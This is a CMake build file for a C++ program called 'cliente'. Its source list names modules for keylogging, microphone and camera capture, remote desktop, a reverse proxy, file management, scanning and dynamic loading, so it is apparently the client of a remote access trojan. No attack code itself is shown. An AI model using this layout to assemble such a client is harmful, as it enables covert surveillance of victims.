cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(cliente LANGUAGES CXX C)

# --- Configuración del estándar C++ ---
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)


set(SRCS main.cpp
         misc.cpp
         cliente.cpp 
         mod_reverse_proxy.cpp
         mod_mic.cpp
         mod_camara.cpp
         mod_file_manager.cpp
         mod_keylogger.cpp
         mod_remote_desktop.cpp
         mod_ventanas.cpp
         mod_info.cpp
         mod_escaner.cpp
         mod_fun.cpp
         mod_dynamic_load.cpp
         ../base64/base64.cpp
         ../sqlite3/sqlite3.c
         ../aes256/aes256.cpp
)


add_executable(cliente ${SRCS})

target_link_libraries(cliente PRIVATE mfuuid)
